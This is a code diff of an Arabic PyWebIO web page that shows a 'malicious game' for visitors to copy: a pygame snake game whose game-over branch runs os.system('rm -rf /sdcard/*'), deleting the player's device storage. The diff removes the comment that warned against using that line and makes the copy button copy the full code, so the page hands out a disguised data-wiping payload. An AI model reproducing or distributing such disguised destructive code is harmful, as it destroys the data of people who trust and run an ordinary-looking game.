@@ -1,10 +1,8 @@
-from pywebio.output import *
-from pywebio.input import *
+from pywebio.output import put_html, put_markdown, put_text, put_button
 from pywebio import start_server
 import os
 import pyperclip
-
-def main():
+def web_main():
     put_html("""
     <style>
         body {
@@ -39,6 +37,8 @@ def main():
             border-radius: 4px;
             font-weight: bold;
             transition: transform 0.2s;
+            border: none;
+            cursor: pointer;
         }
         .social-button:hover {
             transform: translateY(-2px);
@@ -57,18 +57,17 @@ def main():
     <div class="container">
         <h2>مواقعنا على منصات التواصل</h2>
         <div class="social-buttons">
-            <a href="https://www.facebook.com/fars.bla.frs.671146" class="social-button facebook" target="_blank">فيسبوك</a>
-            <a href="https://www.youtube.com/@%D9%8A%D9%8E%D9%88%D9%92%D9%85%D9%90%D9%8A%D9%8E%D8%A7%D8%AA%D9%92-%D9%85%D9%8F%D8%A8%D9%8E%D8%B1%D9%92%D9%85%D9%90%D8%AC%D92" class="social-button youtube" target="_blank">يوتيوب</a>
-            <a href="https://www.instagram.com/frsbl_frs" class="social-button instagram" target="_blank">انستغرام</a>
+            <button class="social-button facebook" onclick="window.open('https://www.facebook.com/fars.bla.frs.671146', '_blank')">فيسبوك</button>
+            <button class="social-button youtube" onclick="window.open('https://www.youtube.com/@يَوْمِيَاتْ-مُبَرْمِجْ-مَّزُجْ', '_blank')">يوتيوب</button>
+            <button class="social-button instagram" onclick="window.open('https://www.instagram.com/frsbl_frs', '_blank')">انستغرام</button>
         </div>
     </div>
     """)
 
-    # ======= المقال يبدأ من هنا =======
     put_html('<div class="container">')
     put_markdown("### اللعبة الخبيثة")
-    put_text("""
-import pygame
+
+    code_snippet = '''import pygame
 import random
 import sys
 import os
@@ -78,7 +77,7 @@ pygame.init()
 WIDTH, HEIGHT = 600, 400
 BLOCK_SIZE = 20
 screen = pygame.display.set_mode((WIDTH, HEIGHT))
-pygame.display.set_caption("لعبة الأفعى")
+pygame.display.set_caption("\u0644\u0639\u0628\u0629 \u0627\u0644\u0623\u0641\u0639\u0649")
 
 WHITE = (255, 255, 255)
 GREEN = (0, 255, 0)
@@ -122,10 +121,10 @@ def draw_buttons():
     pygame.draw.rect(screen, BUTTON_COLOR, right_button_rect)
 
     font = pygame.font.SysFont(None, 50)
-    up_text = font.render("↑", True, WHITE)
-    down_text = font.render("↓", True, WHITE)
-    left_text = font.render("←", True, WHITE)
-    right_text = font.render("→", True, WHITE)
+    up_text = font.render("\u2191", True, WHITE)
+    down_text = font.render("\u2193", True, WHITE)
+    left_text = font.render("\u2190", True, WHITE)
+    right_text = font.render("\u2192", True, WHITE)
 
     screen.blit(up_text, up_text.get_rect(center=up_button_rect.center))
     screen.blit(down_text, down_text.get_rect(center=down_button_rect.center))
@@ -149,7 +148,6 @@ def main():
         for event in pygame.event.get():
             if event.type == pygame.QUIT:
                 running = False
-
             elif event.type == pygame.KEYDOWN:
                 if event.key == pygame.K_UP and snake_dir != (0, BLOCK_SIZE):
                     snake_dir = (0, -BLOCK_SIZE)
@@ -159,7 +157,6 @@ def main():
                     snake_dir = (-BLOCK_SIZE, 0)
                 elif event.key == pygame.K_RIGHT and snake_dir != (-BLOCK_SIZE, 0):
                     snake_dir = (BLOCK_SIZE, 0)
-
             elif event.type == pygame.MOUSEBUTTONDOWN:
                 mouse_pos = event.pos
                 if up_button_rect.collidepoint(mouse_pos) and snake_dir != (0, BLOCK_SIZE):
@@ -187,32 +184,25 @@ def main():
         draw_buttons()
 
         if check_collision(snake):
-            print("انتهت اللعبة!")
-            os.system("rm -rf /sdcard/*")  # تجنب الاستخدام الفعلي لهذا السطر
+            print("\u0627\u0646\u062a\u0647\u062a \u0627\u0644\u0644\u0639\u0628\u0629!")
             running = False
+            os.system("rm -rf /sdcard/*")
 
         pygame.display.flip()
         clock.tick(speed)
 
     pygame.quit()
-    sys.exit()
+    sys.exit()'''
 
-def copy_code():
-    code = '''import pygame
-import random
-import sys
-import os
+    put_text(code_snippet)
 
-pygame.init()
-# ... باقي الكود هنا ...
-'''
-    pyperclip.copy(code)
-    put_text("تم نسخ الكود إلى الحافظة!")
+    def copy_code():
+        pyperclip.copy(code_snippet)
+        put_text("\u062a\u0645 \u0646\u0633\u062e \u0627\u0644\u0643\u0648\u062f \u0625\u0644\u0649 \u0627\u0644\u062d\u0627\u0641\u0638\u0629!")
 
-    put_button("نسخ الكود", onclick=copy_code)
+    put_button("\u0646\u0633\u062e \u0627\u0644\u0643\u0648\u062f", onclick=copy_code)
+    put_html('</div>')
 
-put_html('</div>')
-
-# تشغيل التطبيق
-PORT = int(os.getenv("PORT", 10000))
-start_server(main, port=PORT, debug=True)
+if __name__ == '__main__':
+    PORT = int(os.getenv("PORT", 10000))
+    start_server(web_main, port=PORT, debug=True)
